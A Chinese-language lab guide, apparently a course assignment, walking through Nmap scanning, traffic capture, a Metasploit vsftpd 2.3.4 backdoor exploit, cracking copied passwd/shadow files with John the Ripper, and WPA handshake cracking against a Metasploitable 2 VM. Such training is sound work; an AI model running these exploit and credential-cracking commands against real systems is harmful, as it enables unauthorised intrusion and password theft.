# 实验指南：五大开源安全工具一站式演示

作者：GuYi  
环境：VMware Workstation + Kali Linux（攻击机）+ Metasploitable 2（靶机）

> 本实验仅限在隔离、已获授权的虚拟机环境中进行；切勿在生产网络或第三方系统测试。

---
## 环境与证据管理（前置说明）
- 采用 **Host-only/NAT** 网络，确保 _Kali ↔ 靶机_ IP 可达；演示前后均创建快照。
- 在项目根目录新建 `assignment/screenshots/` 存放截图，命名规范：`NN-Category-Detail.png`（两位序号）。
- 推荐截图序号：01–09 环境；10–19 Nmap；20–29 Wireshark；30–39 Metasploit；40–49 John；50–59 Aircrack。

---
# 五大核心步骤（对应五款工具）

## Step 1 — 信息收集：Nmap
目标：发现存活主机、开放端口、服务及 OS 指纹。
```bash
# 发现靶机
nmap -sn 192.168.126.133
# 端口 & 版本扫描
nmap -sV -O -p- -T4 192.168.126.133
# 可选漏洞脚本
nmap --script=vuln -Pn 192.168.126.133
```
截图：10-Nmap-Discovery.png、11-Nmap-Services.png、12-Nmap-Vuln.png。

---
## Step 2 — 流量捕获：Wireshark / tcpdump
目标：观察 Nmap 扫描及 Web 登录产生的流量模式。
```bash
# 抓取扫描流量（Kali）
sudo tcpdump -i eth0 -w scan.pcap &
# 扫描完成后 Ctrl+C 停止
wireshark scan.pcap &
```
常用过滤：`tcp.flags.syn==1 && tcp.flags.ack==0`、`http.request.method=="POST"`。
截图：20-Tcpdump-Start.png、21-Tcpdump-Stop.png、22-Wireshark-Scan.png、23-Wireshark-HTTP.png。

---
## Step 3 — 漏洞利用：Metasploit Framework
目标：利用 **vsftpd 2.3.4** 后门获取受控 shell。
```bash
# 前置确认
nmap -sV -p 21 192.168.126.133 -Pn -n -v
# 启动 Metasploit（Kali）
msfconsole -q
search vsftpd 2.3.4
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.126.133
run
```
成功后 `id`,`uname -a` 验证。
截图：30-Metasploit-Module.png、31-Metasploit-Session.png。

---
## Step 4 — 密码破解：John the Ripper
目标：展示弱口令风险（仅限实验账户）。
```bash
# 靶机：复制 passwd & shadow 到 /tmp 并传回 Kali
scp msfadmin@192.168.126.133:/tmp/{passwd,shadow} .
# Kali：合并并破解
unshadow passwd shadow > lab_shadow.txt
john --wordlist=/usr/share/wordlists/rockyou.txt lab_shadow.txt
john --show lab_shadow.txt
```
如提示 `rockyou.txt` 不存在：`sudo apt-get install wordlists && gzip -d /usr/share/wordlists/rockyou.txt.gz`。
截图：40-Pw-Files.png、41-John-Run.png、42-John-Show.png。

---
## Step 5 — 无线攻防：Aircrack-ng（离线演示）
目标：使用字典破解 WPA/WPA2 握手包。
```bash
aircrack-ng handshake.pcap -w /usr/share/wordlists/rockyou.txt
```
截图：50-Aircrack-Run.png、51-Aircrack-Result.png。

---
# 附录 A — 系统加固与再评估
- 关闭/升级易受攻击服务，配置防火墙、强密码策略。
- 复扫：`nmap -sV -O -p- -T4 192.168.126.133`，截图 60-Nmap-After.png。

# 附录 B — 工具对比矩阵
| 工具 | 主要功能 | 优势 | 局限 & 伦理 |
|------|----------|------|-------------|
| Nmap | 主机发现、端口/版本扫描 | 速度快，脚本丰富 | 噪声大，易触发 IDS |
| Wireshark | 协议解析、流量取证 | 深度分析直观 | 加密流量不可见 |
| Metasploit | 漏洞利用、后渗透 | 自动化高、模块多 | 高风险，需授权 |
| John | Hash 破解 | 支持多格式、速度快 | 涉及隐私与合法性 |
| Aircrack | 无线测试 | 专攻 Wi-Fi，社区活跃 | 需监听网卡 & 合规 |

---
## 交付物清单
- `ToolLabGuide_v2.md`（本文件）。
- 全流程截图共 ≥ 16 张，存放于 `assignment/screenshots/`。
- （可选）完整实验报告 PDF。

> 完成后请检查 Markdown 渲染、截图链接与步骤编号是否一致。